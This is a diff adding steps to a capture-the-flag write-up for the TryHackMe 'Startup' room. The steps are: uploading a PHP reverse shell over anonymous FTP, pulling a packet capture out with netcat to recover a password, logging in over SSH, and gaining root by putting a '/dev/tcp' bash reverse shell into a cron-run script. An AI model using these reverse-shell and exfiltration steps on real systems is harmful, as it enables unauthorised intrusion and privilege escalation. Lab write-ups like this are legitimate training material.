@@ -168,5 +168,126 @@ get notice.txt
 >When you run the "get" command, the file will be downloaded the to path you were before running the "ftp" command.
 {: .prompt-warning}
 
+Lets see what it says
 
-TEST
+```shell
+Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents 
+from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
+```
+Seems like we got an username: Maya, but for the moment we can't use it no where, so lets proceed to inyect the reverse shell
+
+We will use the a python reverse shell script, which is locate in /share/webshells/php, by uploading it to the webpage
+using the ftp server.
+
+>Make sure to cd into /ftp folder inside the ftp server, otherwise you wont be able to upload the file
+{: .prompt-info}
+
+>Before uploading it, we need to change some of its settings first:
+{: .prompt-warning}
+
+Open the file and search for:
+
+```shell
+$ip = {Set the IP you will get the reverse shell to. In this case, THM's VPN}
+$port {the port you will later conect the netcat to}
+
+I will use port 1234
+```
+
+```ruby
+ftp> put php-reverse-shell.php
+local: web-script.php remote: web-script.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5522 bytes sent in 0.00 secs (89.2574 MB/s)
+ftp> 
+```
+Now, lets set netcat to listen on the port we previosuly set (1234):
+
+```shell
+sudo nc -lvn 1234
+listening on [any] 1234 ....
+```
+Its time to run the script:
+
+```shell
+http://10.10.249.130/files/ftp/php-reserse-shell.php
+```
+If you done it correctly, now you should have the reverse shell setted:
+
+```ruby
+Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 00:20:19 up  1:58,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+>If we run a ls -la we will see a .txt file, which will give us the answer to the first question of the room
+{: .prompt-tip}
+
+Looking through, we found a user called "lennie" in the /home directory, which can be used to stablish a ssh connection.
+Unfortunately, we dont have the password. So lets keep looking:
+
+If we check the root directory again, we can see that as www-data user we have access to a file called "incidents", whichis a wireshark file. Lets download get in into our local machine with the following command:
+
+```shell
+nc -lvpn 1234 > suspicious.pcapng {In our local machine}
+nc {Our VPN IP} 1234 suspicious.pcapng
+
+(Note we are using port 1234, which is the one we setted up in the php file)
+```
+Now that we got it inside our local machine, lets read it with the following command:
+
+```shell
+ettercap -T -r suspicious.pcapng
+```
+
+Looking closely, we can find a password:
+
+```shell
+Fri Oct  2 19:41:45 2020 [70752]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (19)
+c4ntg3t3n0ughsp1c3
+```
+
+Lets use it to get into lennie's ssh we mentioned before:
+
+NICE! It worked.
+
+>Now if we read the user.txt file, we will be able to get the user flag
+{: .prompt-tip}
+
+Now lets try to scale priveleges to get the root.txt flag
+
+Diving into the scripts directory, we can appreciate a planner.sh file. Lets give it a look:
+
+```ruby
+$ cat planner.sh
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+```
+As we can see, its a Cron executable, which takes the input from print.sh (which can be edite by lennie), so we can write a reverse shell command inside it go gain access to root.
+
+Lets just cd /etc directory and nano print.sh and add the following command:
+
+>Before we run the command, we must open a netcat on a desired port. I will use the port 6666
+```shell
+bash -i >& /dev/tcp/{VPN IP}/6666 0>&1 
+```
+
+If yo done it correctly, you are now root using a reverse shell
+
+```ruby
+listening on [any] 6666 ...
+connect to [10.11.3.250] from (UNKNOWN) [10.10.249.130] 42518
+bash: cannot set terminal process group (2773): Inappropriate ioctl for device
+bash: no job control in this shell
+root@startup:~# ls
+ls
+root.txt
+```
+>Now you can submit the root flag! CONGRATULATIONS!!
+{: .prompt-tip}
